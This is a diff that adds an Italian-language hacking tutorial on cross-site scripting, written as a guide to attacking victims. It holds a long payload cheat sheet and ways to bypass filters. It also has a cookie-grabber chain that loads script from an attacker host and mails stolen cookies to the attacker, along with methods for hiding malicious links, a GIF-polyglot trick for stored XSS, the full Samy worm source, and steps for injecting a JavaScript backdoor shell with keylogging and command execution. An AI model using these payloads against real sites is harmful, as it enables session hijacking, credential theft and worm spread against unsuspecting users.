@@ -1,0 +1,1010 @@
+<html>
+<head>
+<title>[italian] XSS:Cross Site Scripting</title>
+<pre>
+                 .____________________________________.
+                 |+----------------------------------+|
+                 || --//XSS:Cross Site Scripting//-- ||
+                 ||              [!]                 ||
+                 ||            c0de by               ||
+                 ||      XaDoS &amp; MassaKretor         ||
+                 |+----------------------------------+|
+                 *^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^*
+[!]Indice:
+
+   1. Cosa sono le XSS
+   2. Come utilizzarle + cheats
+   3. Analisi di un attacco
+   4. Come eludere i filtri
+   5. Sfruttare le XSS con un Cookie Grabber
+   6. Offuscamento dell'url
+   7. XSS non Sfruttabili
+   8. Altri tipi di XSS
+   9. Eseguire Codice Remoto
+  10. XSS W0rm
+  11. JavaScript Shell: inniettare una Backdoor tramite XSS
+  12. SQL + XSS =... le XFS
+  13. CSRF o XSRF: Cross Site Request Forgery / Sea Surf
+  14. Post_fazione + ringraziamenti
+
+
+
+//Start-0x01\\
+
+
+[+]Cosa Sono
+
+Le vulnerabilit‡ di tipo Cross Site Scripting ( XSS ) sono vulnerabilit‡ che affliggono 
+
+davvero una mole di siti web dinamici e fanno parte della famiglia dei Code Injection.
+Le XSS non sono nient'altro che una modifica dei parametri  HTTP GET e  HTTP POST attraverso 
+
+l'esecuzione di codice Javascript a livello di url, inserito opportunamente in una variabile 
+
+o pi˘.
+
+
+
+
+
+
+[+] How To: Come Utilizzarle
+
+In se scoprire un' XSS	non Ë un'impresa difficile, e per sfruttarla basta semplice codice 
+
+javascript... L'esempio pi˘ comune Ë il classico:
+
+&quot;&gt;&lt;script&gt;alert('prova xss')&lt;/script&gt; 
+
+Analizziamolo:
+ 
+&quot;&gt; non fa altro che chiudere il tag della richiesta.
+&lt;script&gt;&lt;/script&gt; invece comprede il codice javascript da eseguire, in questo caso 
+
+alert('prova') che a sua volta non fa altro che far apparire a schermo un Alert con scritto 
+
+'prova'.
+
+Se vedete apparire l'alert, vuol dire che siete in grado di inserire codice javascript e che 
+
+il sito non filtra bene le richieste, insomma: Ë vulnerabile. Vediamo se Ë possibile 
+
+visualizzare i nostri Cookie in un Alert:
+
+&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+
+Se nell'alert appaiono i nostri cookie allora vuol dire che il sito Ë completamente 
+
+vulnerabile, cioË possiamo indurre il browser a fare tra le pi˘ svariate operazioni, ad 
+
+esempio salvare i Cookie stampati a schermo su un nostro spazio web, oppure creare una 
+
+codice che redirecti la vittima su un sito scelto da noi.
+
+Tutto questo nel migliore dei casi, altrimenti basta analizzare l'url e modificare 
+
+leggermente il nostro codice Javascript, inserendo al posto della normale stringa 
+
+&lt;script&gt;..&lt;/script&gt; altro tipo di codice, esistono centinaia di cheat sheet su internet, qui 
+
+riporto le pi˘ aggiornate ed usate:
+
+&lt;script&gt;alert(1);&lt;/script&gt;
+
+&lt;script&gt;alert('XSS');&lt;/script&gt;
+
+&lt;script src=&quot;http://www.evilsite.org/cookiegrabber.php&quot;&gt;&lt;/script&gt;
+
+&lt;script&gt;location.href=&quot;http://www.evilsite.org/cookiegrabber.php?cookie=&quot;+escape(document.co
+
+okie)&lt;/script&gt;
+
+&lt;scr&lt;script&gt;ipt&gt;alert('XSS');&lt;/scr&lt;/script&gt;ipt&gt;
+
+&lt;script&gt;alert(String.fromCharCode(88,83,83))&lt;/script&gt;
+
+&lt;img src=foo.png onerror=alert(/xssed/) /&gt;
+
+&lt;style&gt;@im\port'\ja\vasc\ript:alert(\&quot;XSS\&quot;)';&lt;/style&gt;
+
+&lt;? echo('&lt;scr)'; echo('ipt&gt;alert(\&quot;XSS\&quot;)&lt;/script&gt;'); ?&gt;
+
+&lt;marquee&gt;&lt;script&gt;alert('XSS')&lt;/script&gt;&lt;/marquee&gt;
+
+&lt;IMG SRC=\&quot;jav&amp;#x09;ascript:alert('XSS');\&quot;&gt;
+
+&lt;IMG SRC=\&quot;jav&amp;#x0A;ascript:alert('XSS');\&quot;&gt;
+
+&lt;IMG SRC=\&quot;jav&amp;#x0D;ascript:alert('XSS');\&quot;&gt;
+
+&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;
+
+&quot;&gt;&lt;script&gt;alert(0)&lt;/script&gt;
+
+&quot;&gt;&lt;script src=http://yoursite.com/your_files.js&gt;&lt;/script&gt;
+
+&lt;/title&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;
+
+&lt;/textarea&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;
+
+&lt;IMG LOWSRC=\&quot;javascript:alert('XSS')\&quot;&gt;
+
+&lt;IMG DYNSRC=\&quot;javascript:alert('XSS')\&quot;&gt;
+
+&lt;font style='color:expression(alert(document.cookie))'&gt;
+
+'); alert('XSS
+
+&lt;img src=&quot;javascript:alert('XSS')&quot;&gt;
+
+&lt;script language=&quot;JavaScript&quot;&gt;alert('XSS')&lt;/script&gt;
+
+[url=javascript:alert('XSS');]click me[/url]
+
+&lt;body onunload=&quot;javascript:alert('XSS');&quot;&gt;
+
+&lt;body onLoad=&quot;alert('XSS');&quot;
+
+[color=red' onmouseover=&quot;alert('xss')&quot;]mouse over[/color]
+
+&quot;/&gt;&lt;/a&gt;&lt;/&gt;&lt;img src=1.gif onerror=alert(1)&gt;
+
+window.alert(&quot;Bonjour !&quot;);
+
+&lt;div 
+
+style=&quot;x:expression((window.r==1)?'':eval('r=1;alert(String.fromCharCode(88,83,83));'))&quot;&gt; 
+
+&lt;iframe&lt;?php echo chr(11)?&gt; onload=alert('XSS')&gt;&lt;/iframe&gt;
+ 
+&quot;&gt;&lt;script alert(String.fromCharCode(88,83,83))&lt;/script&gt;
+
+'&gt;&gt;&lt;marquee&gt;&lt;h1&gt;XSS&lt;/h1&gt;&lt;/marquee&gt;
+
+'&quot;&gt;&gt;&lt;script&gt;alert('XSS')&lt;/script&gt;
+
+'&quot;&gt;&gt;&lt;marquee&gt;&lt;h1&gt;XSS&lt;/h1&gt;&lt;/marquee&gt;
+
+&lt;META HTTP-EQUIV=\&quot;refresh\&quot; CONTENT=\&quot;0;url=javascript:alert('XSS');\&quot;&gt;
+
+&lt;META HTTP-EQUIV=\&quot;refresh\&quot; CONTENT=\&quot;0; 
+URL=http://;URL=javascript:alert('XSS');\&quot;&gt;
+
+&lt;script&gt;var var = 1; alert(var)&lt;/script&gt;
+
+&lt;STYLE type=&quot;text/css&quot;&gt;BODY{background:url(&quot;javascript:alert('XSS')&quot;)}&lt;/STYLE&gt;
+
+&lt;?='&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;'?&gt;
+
+&lt;IMG SRC='vbscript:msgbox(\&quot;XSS\&quot;)'&gt;
+
+ &quot; onfocus=alert(document.domain) &quot;&gt; &lt;&quot;
+
+&lt;FRAMESET&gt;&lt;FRAME SRC=\&quot;javascript:alert('XSS');\&quot;&gt;&lt;/FRAMESET&gt;
+
+&lt;STYLE&gt;li {list-style-image: url(\&quot;javascript:alert('XSS')\&quot;);}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS
+
+perl -e 'print \&quot;&lt;SCR\0IPT&gt;alert(\&quot;XSS\&quot;)&lt;/SCR\0IPT&gt;\&quot;;' &gt; out
+
+perl -e 'print \&quot;&lt;IMG SRC=java\0script:alert(\&quot;XSS\&quot;)&gt;\&quot;;' &gt; out
+
+&lt;br size=\&quot;&amp;{alert('XSS')}\&quot;&gt;
+
+&lt;scrscriptipt&gt;alert(1)&lt;/scrscriptipt&gt;
+
+&lt;/br style=a:expression(alert())&gt;
+
+&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+
+&quot;&gt;&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert(&quot;XSS&quot;)&gt;
+
+[color=red width=expression(alert(123))][color]
+
+&lt;BASE HREF=&quot;javascript:alert('XSS');//&quot;&gt;
+
+Execute(MsgBox(chr(88)&amp;chr(83)&amp;chr(83)))&lt;
+
+&quot;&gt;&lt;/iframe&gt;&lt;script&gt;alert(123)&lt;/script&gt;
+
+&lt;body onLoad=&quot;while(true) alert('XSS');&quot;&gt;
+
+'&quot;&gt;&lt;/title&gt;&lt;script&gt;alert(1111)&lt;/script&gt;
+
+&lt;/textarea&gt;'&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+
+'&quot;&quot;&gt;&lt;script language=&quot;JavaScript&quot;&gt; alert('X \nS \nS');&lt;/script&gt;
+
+&lt;/script&gt;&lt;/script&gt;&lt;&lt;&lt;&lt;script&gt;&lt;&gt;&gt;&gt;&gt;&lt;&lt;&lt;script&gt;alert(123)&lt;/script&gt;
+
+&lt;html&gt;&lt;noalert&gt;&lt;noscript&gt;(123)&lt;/noscript&gt;&lt;script&gt;(123)&lt;/script&gt;
+
+&lt;INPUT TYPE=&quot;IMAGE&quot; SRC=&quot;javascript:alert('XSS');&quot;&gt;
+
+'&gt;&lt;/select&gt;&lt;script&gt;alert(123)&lt;/script&gt;
+
+'&gt;&quot;&gt;&lt;script src = 'http://www.site.com/XSS.js'&gt;&lt;/script&gt;
+
+}&lt;/style&gt;&lt;script&gt;a=eval;b=alert;a(b(/XSS/.source));&lt;/script&gt;
+
+&lt;SCRIPT&gt;document.write(&quot;XSS&quot;);&lt;/SCRIPT&gt;
+
+a=&quot;get&quot;;b=&quot;URL&quot;;c=&quot;javascript:&quot;;d=&quot;alert('xss');&quot;;eval(a+b+c+d);
+
+='&gt;&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;
+
+&lt;script+src=&quot;&gt;&quot;+src=&quot;http://yoursite.com/xss.js?69,69&quot;&gt;&lt;/script&gt;
+
+&lt;body background=javascript:'&quot;&gt;&lt;script&gt;alert(navigator.userAgent)&lt;/script&gt;&gt;&lt;/body&gt;
+
+&quot;&gt;/XaDoS/&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;script 
+
+src=&quot;http://www.site.com/XSS.js&quot;&gt;&lt;/script&gt;
+
+data:text/html;charset=utf-7;base64,Ij48L3RpdGxlPjxzY3JpcHQ+YWxlcnQoMTMzNyk8L3NjcmlwdD4=
+
+
+
+
+
+
+[+]Analisi di un attacco
+
+Il sito www.caziotio.it ha un campo search, proviamo a cercare il nostro codice javascript e 
+
+l'url generato dovrebbe essere cosÏ:
+
+http://www.caziotio.it/default.asp?rif=1&amp;tiporicerca=2&amp;strRicerca1=
+%22%3E%3Cscript%3Ealert('prova');%3C/script%3E&amp;strRicerca2=
+&amp;strRicerca3=&amp;sel1=AND&amp;sel2=AND&amp;RicInt1=1&amp;RicInt2=0&amp;RicInt3=0 
+
+Vediamo che la variabile strRicerca1 contiene il nostro codice. Proviamo a Passarlo 
+
+direttamente e togliere le parti superflue:
+
+http:www.caziotio.it/default.asp?rif=1&amp;tiporicerca=2&amp;str
+Ricerca1=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt; 
+
+Ecco che ìForseî vedremo i nostri cookie apparire a schermo.
+
+
+
+
+
+
+[+]Come Eludere I Filtri
+
+Molte volte i fitltri si occupano semplicemente di cancellare o alterare, se presenti, 
+
+determinati simboli o parole, tipo chessÚ aggiungere uno ì/ ì se il primo carattere Ë ì&lt;î, 
+
+oppure altri metodi non molto efficaci e facilmente oltrepassabili.
+
+Il metodo pi˘ classico per eludere certi filtri Ë chiudere il tag, aggiungendo ì&gt; prima del 
+
+codice da eseguire.
+Molte molte invece ci si trova davanti ad un filtro creato con una semplice stringa del 
+
+tipo:
+
+$var = str_replace (&quot;&lt;script&gt;&quot;, &quot;script&quot;, $var);
+
+Che blocca l'uso di &lt;script&gt; &amp; di script, impedendoci di eseguire il codice javascript tra i 
+
+due tag. In questo caso Ë facile, basta usare un qualunque altro codice javascript come 
+
+quelli sopra riportati:
+
+&lt;IMG SRC='vbscript:msgbox(\&quot;XSS\&quot;)'&gt;
+
+Altre volte invece possimao trovarci davanti ad un particolare filtro chiamato addslashes 
+
+che si occupa appunto di aggiungere un carattere '\' davanti a tutti i caratteri ' , in tal 
+
+modo rende nullo il codice.
+Come bypassarlo? Semplice:  o codifichiamo i nostri codici javascript che vogliamo immettere 
+
+nell alert in decimali(&amp;#116),hex(%74%0A),ascii(abct) e base64(dAoK); oppure cerchiamo un 
+
+codice javascript che non usi i caratteri bloccati, esempio:
+
+}&lt;/style&gt;&lt;script&gt;a=eval;b=alert;a(b(/XSS/.source));&lt;/script&gt;
+
+o
+
+&lt;script&gt;alert(1);&lt;/script&gt;
+
+Come detto sopra ci sono moltissime cheat sheet su internet e poi basta imparare il 
+
+javascript e con poche modifiche si riescono ad eludere filtri apparentemente impossibili, 
+
+dipende tutto da voi e dalla vostra fantasia.
+
+
+
+
+
+
+[+]Sfruttare XSS Con Un Cookie Grabber
+
+Indubbiamente il metodo pi˘ usato e il pi˘ ìefficaceî.
+Consiste nell'includere un file javascript nella variabile che viene stampata, il quale file 
+
+richiama una pagina in php che si occupa di loggare i Cookie dell'user che apre il link 
+
+appositamente preparato.
+
+Praticamente:
+
+Codice Javascript:
+
+&quot;&gt;&lt;script src=&quot;http://www.nostrosito.com/cookiescript.js&quot;&gt;&lt;/script&gt;
+
+All'interno del file cookiescript.js ci scriveremo il codice che passa il Cookie ad una 
+
+pagina php:
+
+&lt;script&gt;location.href=&quot;http://nostrosito.com/cookie.php?cookie=&lt;/script&gt;
+
+Il file cookie.php invece conterr‡ il codice php che si occupa di farci recapitare il 
+
+cookie:
+
+&lt;? mail(&quot;nostra@mail.com&quot;,&quot;Ecco il cookie rubato&quot;,$_GET['cookie']; ?&gt;
+
+Uppato il tutto l'url sar‡ all'incirca:
+
+http://www.caiotizio.it/default.asp?rif=1&amp;tiporicerca=2&amp;strRicerca1=&quot;&gt;&lt;script 
+
+src=&quot;http://www.nostrosito.com/cookiescript.js&quot;&gt;&lt;/script&gt;
+
+
+[+]Offuscamento dell'url
+
+Ora dobbiamo occuparci di come nascondere l'url sopra descritta in modo tale che un utente 
+
+normale non si accorga di nulla (molte persone non si accorgono neppure di un link con 
+
+all'interno del javascript code ben in vista,comunque noi facciamo le cose per bene)
+
+Abbiamo diverse opzioni:
+
+1#-- P0ssiamo nascondere l'url attraverso alcuni servizi quali tinyurl(www.tinyurl.com),che 
+
+ci permette di rendere un qualsiasi indirizzo web qualcosa del tipo: 
+
+http://tinyurl.com/2rery1
+
+
+2#-- Possiamo convertire l'intera url in hex:
+
+http://www.caiotizio.it/default.asp?rif=1&amp;tiporicerca=2&amp;strRicerca1=223e3c736372697074207372
+
+633d22687474703a2f2f7777772e6e6f7374726f7369746f2e636f6d2f636f6f6b69657363726970742e6a73223e
+
+3c2f7363726970743e
+
+In questo modo sembrer‡ un normalissimo link.
+
+Se L'utente aprir‡ il link e tutto va a bu0n fine vedremo nella nostra casella postale i 
+
+c00kie della vittima in questi0ne.
+
+
+
+
+
+
+
+
+[+]XSS Non Sfruttabili
+
+Alcuni siti web hanno avuto almeno la furbizia di filtrare le richieste HTTP POST ed HTTP 
+
+GET in modo da non consentire redirect e quindi furto di Cookie.
+PerÚ se riusciamo comunque ad eseguire del codice esterno, possiamo tuttavia creare una 
+
+pagina web simile a quella originale ed usarla per appropiarci di password o altri dati 
+
+sensibili.
+
+Esempio:
+Pagina da includere: http://vuln.xssed.net/thirdparty/scripts/ckers.org.js
+
+L'url del sito sar‡:
+
+http://sitovittima.it/paginavulnerabile.php?varvuln=&quot;&gt;&lt;script 
+
+src=&quot;http://vuln.xssed.net/thirdparty/scripts/ckers.org.js&quot;&gt;&lt;/script&gt;
+
+La pagina in js, se il sito non filtra, puÚ anche essere scritta in HTML, e sar‡ quindi
+http://sitodelpoverocaio.it/paginavulnerabile.php?varvuln=&quot;&gt;&lt;script 
+
+src=&quot;http://vuln.xssed.net/thirdparty/scripts/ckers.org.html&quot;&gt;&lt;/script&gt;
+
+In questo modo all'url creato corrisponder‡ la pagina che in js ( o HTML ) che abbiamo 
+
+incluso.
+
+
+
+
+
+
+
+[+]Altri tipi di XSS:
+
+CHi ha mai dett che in una xss possiamo solo inserire un testo o far comparire un alert o 
+
+giocare con i cookie..?
+POssiamo fare molte altre cose come includere immagini,video,redirect e quant'altro..
+Ecco qui di seguito una piccola lista di codice Javascript alternativo:
+
+Stampare un'immagine nella pagina vulnerabile:
+
+&lt;IMG SRC=&quot;http://www.tuosito.com/img.png&quot;&gt;
+
+Visualizzare un video:
+
+&lt;EMBED SRC=&quot;http://www.tuosito.com/video.swf&quot;&gt;
+
+Redirect verso un altra pagina web\video\immagine:
+
+&lt;script&gt;window.open(&quot;http://www.tuosito.com/pagina.html&quot;)&lt;/script&gt;
+
+ *al posto di ../pagina.html possiamo mettere tutto: video.swf / img.png   / ecc..
+
+
+
+
+
+
+[+]Eseguire Codice Remoto
+
+Supponiamo che tutti i metodi provati falliscano.
+C'Ë sempre una scappatoia.
+I filtri bloccano i caratteri HTML contenuti nelle variabili di testo. E se il codice Ë 
+
+inserito in un'immagine?
+Non c'Ë problema, possiamo inserire codice Javascript nell'immagine stessa:
+
+Prima di tutto dobbiamo identificare l'estensione dell'immagine(gif,bmp,jpg..), una volta 
+
+trovata apriamo l'immagine con un editor di testo qualunque (blocco Note per windows e 
+
+kwrite per linux)
+
+Ci troveremo davanti ad un codice lunghissimo del genere:
+(esempio codice di un immagine .gif):
+
+GIF89aÌ ^˜˚ 
+
+/%,4*,30+1.5I3M7f/K2e21N46hD:5I7J6;d6FTKlau4JQ3Oj9eR8dmMK2M.O15jl0n0m45HIRkN3MO8ieHj7Lh:mQJO
+
+O6RcSg6pGoL6jpjp6PMOOPnThNRjnnNPmQmnnOono48à&gt;&gt;§VÅfÅ 
+
+~π6Nå9Tß8gè7l©3t≈d9éPRãTU©RmèTo™nPíuS©poèsn≠QSƒXk«rW∆tq«wtÊYÉ6|Åsã6s•=WÑNXÉptäNsâpxßQv©nxÃd6
+
+è±/ûÃUÖìUåÆP•ïrãêsç≠y¶ìvß±t°Ã|›®w≈◊ó65ó8MëJèM6îqèm8±QÆN7¨m∞k7éQNçTlêlRènoÆQMÆTmØnRÆqoÃ97«9LÕ
+
+X8…RM…Uj oRÀsoÁTL‰VmÂqQÊsní5û•4–äUèàU¨èqèën±¨Wå≠T±Æté¨u≠ùp……:±«4—ÕtëÀp“üá 
+
+åî8ñ®:Æé7ÆÆ8êìOëèoñ©Pñ™n∞éS∞éq¨ØRØØo¥»7ó«Ró…mçÂZó‰f±≈S¥∆p¨Âsÿ°6ÃéUŒêpÕ´U–¨oÂèUÂìpÁ≠TÊ≠p·Ã5…»
+
+R……r›ÁN–‰wÏÕMÍ…sÛÏVıÚsëèëëêÆï™íï¨∞∞èêÆìÆ∞Æë∞Ø∞îë ñïÂî∞Ãî≥ÂÆíÃ¥îÂ∞∞Ã±±Êô«ìò»±êÓõïÔÆ¥»ë≤…±¥„î±
+
+Í±ò»œó ÂöÁŒñÊÎ±ÃŒ≤ŒÁ∂‰–∂ÊÍÃíè ï¨œ≠íŒ∞ÆÊïçËñ´ÊØíÁ≥≠«ñÕ…óÍÀ≤ÀŒØÓËï „íÒÁ¥…Â≥ˆÕÃîœÃ∞‘Âó‘Â∞ÈÃïËÕ∞
+
+ÍÁòÎÈ±ÕœŒŒ—Ë—Ê—“ÁÍÈ—ŒÈ“ÏÏÍ–ÓÓ               !ˇ
+NETSCAPE2.0    !˘   ˇ ,    Ì ^ ˛  [ecc.......]
+
+L'importante Ë notare i primi caratteri, poichË sono sempre gli stessi:
+
+GIF89a
+
+Ora cancelliamo tutto tranne questi pochi caratteri iniziali(che servono per riconoscere ed 
+
+accettare questo file come .gif)
+Ed inseriamo l'ormai famoso codice Javascript:
+
+GIF89a&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;
+
+Ora salviamo l'immagine (sempre in .gif) e facciamo l'upload sul sito vittima / forum / 
+
+sezione commenti ..
+Ora questa xss Ë diventata permanente poichË chiunque vada sull'url contenente questa 
+
+immagine.gif potr‡ oservare il nostro alert!
+(Mozilla FireFox non mostra sempre questi tipi di alert, IE invece si)
+
+Ricordiamoci che per ogni estensione di immagine quei pochi caratteri cambiano, qui vi 
+
+riporto una lista dei suddetti caratteri:
+
+-PNG = âPNG
+
+-GIF = GIF89a
+
+-JPG = ˇÿˇ‡ JFIF
+
+-BMP = BMF÷
+
+
+
+
+
+[+] XSS W0rm:
+
+Questo Ë un argomento non molto sviluppato proprio perchË Ë ancora in fase di sviluppo, 
+
+basti pensare infatti che il primo w0rm legato alle XSS Ë nato nel 2005 e si chiamava Samy;
+Samy era un w0rm per myspace,e per evitare le restrizioni del provider, che non consente 
+
+l'upload di javascript, l'utente ha inserito lo script nei CSS e Internet Explorer ha fatto 
+
+il resto. Il codice, infatti, avrebbe dovuto essere considerato un CSS non valido, ma IE lo 
+
+ha eseguito e lo ha fatto propagare per i membri della community.
+Attraverso questo verme Samy ha infettato pi˘ di un milione di account e continuava a 
+
+replicarsi aggiungendo amici al profilo dell utente creatore del w0rm.(alle 9.30 della 
+
+stessa notte le richieste erano milioni e continuavano ad affluire ogni millesimo di 
+
+secondo, cosÏ facendo myspace Ë caduto ed Ë andato offline)
+Code of Samy:
+
+&lt;div id=mycode style=&quot;BACKGROUND: url('java
+script:eval(document.all.mycode.expr)')&quot; expr=&quot;var B=String.fromCharCode(34);var 
+
+A=String.fromCharCode(39);function g(){var C;try{var 
+
+D=document.body.createTextRange();C=D.htmlText}catch(e){}if(C){return C}else{return 
+
+eval('document.body.inne'+'rHTML')
+}}
+function getData(AU){M=getFromURL(AU,'friendID');L=getFromURL(AU,'Mytoken')}function 
+
+getQueryParams(){var E=document.location.search;var F=E.substring(1,E.length).split('&amp;');var 
+
+AS=new Array();for(var O=0;O&lt;F.length;O++){var I=F[O].split('=');AS[I[0]]=I[1]}return AS}var 
+
+J;var AS=getQueryParams();var L=AS['Mytoken'];var 
+
+M=AS['friendID'];if(location.hostname=='profile.myspace.com'){document.location='http://www.
+
+myspace.com'+location.pathname+location.search}else{if(!M){getData(g())}main()}function 
+
+getClientFID(){return findIn(g(),'up_launchIC( '+A,A)}function nothing(){}function 
+
+paramsToString(AV){var N=new String();var O=0;for(var P in AV){if(O&gt;0){N+='&amp;'}var 
+
+Q=escape(AV[P]);while(Q.indexOf('+')!=-1){Q=Q.replace('+','%2B')}while(Q.indexOf('&amp;')!=-1){Q
+
+=Q.replace('&amp;','%26')}N+=P+'='+Q;O++}return N}function httpSend(BH,BI,BJ,BK){if(!J){return 
+
+false}eval('J.onr'+'eadystatechange=BI');J.open(BJ,BH,true);if(BJ=='POST'){J.setRequestHeade
+
+r('Content-Type','application/x-www-form-urlencoded');J.setRequestHeader('Content-Length',BK
+
+.length)}J.send(BK);return true}function findIn(BF,BB,BC){var R=BF.indexOf(BB)+BB.length;var 
+
+S=BF.substring(R,R+1024);return S.substring(0,S.indexOf(BC))}function 
+
+getHiddenParameter(BF,BG){return findIn(BF,'name='+B+BG+B+' value='+B,B)}function 
+
+getFromURL(BF,BG){var T;if(BG=='Mytoken'){T=B}else{T='&amp;'}var U=BG+'=';var 
+
+V=BF.indexOf(U)+U.length;var W=BF.substring(V,V+1024);var X=W.indexOf(T);var 
+
+Y=W.substring(0,X);return Y}function getXMLObj(){var 
+
+Z=false;if(window.XMLHttpRequest){try{Z=new XMLHttpRequest()}catch(e){Z=false}}else 
+
+if(window.ActiveXObject){try{Z=new ActiveXObject('Msxml2.XMLHTTP')}catch(e){try{Z=new 
+
+ActiveXObject('Microsoft.XMLHTTP')}catch(e){Z=false}}}return Z}var AA=g();var 
+
+AB=AA.indexOf('m'+'ycode');var AC=AA.substring(AB,AB+4096);var AD=AC.indexOf('D'+'IV');var 
+
+AE=AC.substring(0,AD);var 
+
+AF;if(AE){AE=AE.replace('jav'+'a',A+'jav'+'a');AE=AE.replace('exp'+'r)','exp'+'r)'+A);AF=' 
+
+but most of all, samy is my hero. &lt;d'+'iv id='+AE+'D'+'IV&gt;'}var AG;function 
+
+getHome(){if(J.readyState!=4){return}var 
+
+AU=J.responseText;AG=findIn(AU,'P'+'rofileHeroes','&lt;/td&gt;');AG=AG.substring(61,AG.length);if(
+
+AG.indexOf('samy')==-1){if(AF){AG+=AF;var AR=getFromURL(AU,'Mytoken');var AS=new 
+
+Array();AS['interestLabel']='heroes';AS['submit']='Preview';AS['interest']=AG;J=getXMLObj();
+
+httpSend('/index.cfm?fuseaction=profile.previewInterests&amp;Mytoken='+AR,postHero,'POST',params
+
+ToString(AS))}}}function postHero(){if(J.readyState!=4){return}var AU=J.responseText;var 
+
+AR=getFromURL(AU,'Mytoken');var AS=new 
+
+Array();AS['interestLabel']='heroes';AS['submit']='Submit';AS['interest']=AG;AS['hash']=getH
+
+iddenParameter(AU,'hash');httpSend('/index.cfm?fuseaction=profile.processInterests&amp;Mytoken='
+
++AR,nothing,'POST',paramsToString(AS))}function main(){var AN=getClientFID();var 
+
+BH='/index.cfm?fuseaction=user.viewProfile&amp;friendID='+AN+'&amp;Mytoken='+L;J=getXMLObj();httpSen
+
+d(BH,getHome,'GET');xmlhttp2=getXMLObj();httpSend2('/index.cfm?fuseaction=invite.addfriend_v
+
+erify&amp;friendID=11851658&amp;Mytoken='+L,processxForm,'GET')}function 
+
+processxForm(){if(xmlhttp2.readyState!=4){return}var AU=xmlhttp2.responseText;var 
+
+AQ=getHiddenParameter(AU,'hashcode');var AR=getFromURL(AU,'Mytoken');var AS=new 
+
+Array();AS['hashcode']=AQ;AS['friendID']='11851658';AS['submit']='Add to 
+
+Friends';httpSend2('/index.cfm?fuseaction=invite.addFriendsProcess&amp;Mytoken='+AR,nothing,'POS
+
+T',paramsToString(AS))}function httpSend2(BH,BI,BJ,BK){if(!xmlhttp2){return 
+
+false}eval('xmlhttp2.onr'+'eadystatechange=BI');xmlhttp2.open(BJ,BH,true);if(BJ=='POST'){xml
+
+http2.setRequestHeader('Content-Type','application/x-www-form-urlencoded');xmlhttp2.setReque
+
+stHeader('Content-Length',BK.length)}xmlhttp2.send(BK);return true}&quot;&gt;&lt;/DIV&gt;
+
+
+Ora, senza stare a spiegare riga per riga possiamo capire che i w0rm xss sono pericolosi per 
+
+sistemi e community quali myspace,yahoo ecc..
+Vi basti pensare che in tutto i w0rm si contano sulle dita:
+
+DATA:           NOME W0RM        BERSAGLIO
+
+01/11/2008      New Orkut Worm 	 Orkut
+08/07/2008 	JustinTV Worm 	 Justin TV
+24/01/2008 	Yamanner 	 Yahoo! Mail Service
+24/01/2008 	hi5 Worm 	 hi5
+24/01/2008 	Gaia Worm 	 Gaiaonline
+24/01/2008 	Orkut Worm 	 Orkut
+24/01/2005 	Samy Worm        Myspace
+
+Non reputo ci sia molto altro da dire, per questo argomento non ci sono regole o tutorial, 
+
+ognuno dovrebbe riuscire a trovare una vulnerabilit‡ che gli permetta di inserire codici 
+
+simili a questie comunque sia, non Ë una cosa che personalmente mi interessa.
+
+
+
+
+
+
+[+] JavaScript Shell -  XSS &amp; Backdoor
+
+Ora parliamo di una cosa m000lto c00l!! ;-)
+Sfruttiamo una vulnerabilit‡ XSS per inniettare una backdoor a discapito di un povero user 
+
+vittima.
+
+Procedimento:
+Grazie ad un apposito tool creato da Inj3ct-it crew possiamo fare qualcosa di molto pi˘ 
+
+pericoloso che un semplice alert, anche questa Ë una delle tecniche che le persone non 
+
+conoscono con le XSS e cosÏ facendo, restando ingnoranti, e le sottovalutano.
+
+Requisiti 2 files:
+
+-JsBack.php (from Inj3ct-it)
+
+-shell.js (from Inj3ct-it)
+
+Come primo passo dobbiamo uplodare sul nostro sito i 2 files jsback.php &amp; shell.js,
+e modificare le impostazioni iniziali( password e username per accedere nel file jsback.php 
+
+mentre in shell.js dobbiamo settare l'url e altro(troverete istruzioni dettagliate 
+
+all'interno dello stesso)).
+Adesso supponiamo di aver trovato un xss su un sito che ci permette di includere javascript 
+
+code, possiamo quindi scrivere:
+
+http://sitovittima.com/vuln.php?x=1&quot;&gt;/XaDoS/&gt;&lt;script 
+
+src=&quot;http://nostrosito.com/shell.js&quot;&gt;&lt;/script&gt;
+
+facendo cliccare come al solito alla vittima il nostro cattivissimo indirizzo questa volta 
+
+succeder‡ qualcosa di diverso:
+
+Essendo l'utente collegato e loggato ad il sitovittima in questione attraverso la shell.js 
+
+nella nostra pagina privata jsback.php ci appariranno i suoi cookies! ma non solo: il suo 
+
+ip, informazioni riguardanti la sua macchina ecc.. in pi˘ grazie a questa particolare pagina 
+
+ci sono altre funzioni come keylogger/esecuzione comandi/proxy/ CSRF(di cui tratterÚ nel 
+
+prossimo capitolo) ecc
+che perÚ potrete vedere sul sito degli autori (Inj3ct-it).
+
+Capite quindi che .. non si scherza con le XSS !! ;-)
+ 
+
+
+
+
+
+[!] Le XSS stanno sempre bene con le SQL: una dentro l'altra
+
+Quanti di voi sanno quanto spesso cpaita che uno trovi una SQL e scopri in seguito che la 
+
+stessa variabile buggata Ë vuln a XSS; oppure, ancora meglio, quante volte capita che ci si 
+
+trova davanti ad una XSS e poco dopo trovi qualcuno che ti dice:&quot;hey! ma qui c'Ë un sql!&quot;( 
+
+s3rg3770 :) )
+Bene possiamo quindi giungere alla conclusione che stanno bene insieme.
+
+Ma se vi dicessi che UNa puÚ perfino stare dentro l'altra?
+suona strana come frase vero..
+VI spiego bene:
+Semplicemente una volta trovata una sql, possiamo benissimo usare il nostro solito comando 
+
+char()
+
+in modo un po' stravagante:
+
+come sappiamo di solito inseriamo del codice, convertito in ASCII. Ma allora se provassimo 
+
+ad inserire codice JavaScript ?? su, proviamoci.
+Passiamo subito al codice:
+
+abbiamo la nostra tipica XSS:
+
+&lt;script&gt;alert('xssbyXaDoS')&lt;/script&gt;
+
